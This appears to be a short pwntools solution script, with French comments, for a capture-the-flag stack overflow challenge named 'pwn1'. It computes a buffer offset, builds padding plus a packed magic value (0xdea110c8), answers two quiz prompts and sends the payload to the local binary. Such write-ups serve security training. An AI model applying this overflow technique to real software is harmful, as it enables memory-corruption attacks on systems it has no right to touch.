from pwn import *

#
# Construction des variables utilisés
#
BINARY_NAME = './pwn1'

USER_INPUT_STACK_PLACE = 0x43
VAR_TO_OVERWRITE_STACK_PLACE = 0x18

# calcule de l'offset
OFFSET = USER_INPUT_STACK_PLACE - VAR_TO_OVERWRITE_STACK_PLACE

DESIRED_INPUT = 0xdea110c8

#
# Création du payload
#
payload = b""
payload += b"A" * OFFSET
payload += p32(DESIRED_INPUT)

#
# Démarage de l'exploitation
#

binary = process(BINARY_NAME)

# envoyer les réponses des deux premières questions
binary.sendline("Sir Lancelot of Camelot")
binary.sendline("To seek the Holy Grail.")

# envoyer le payload
binary.sendline(payload)

binary.interactive()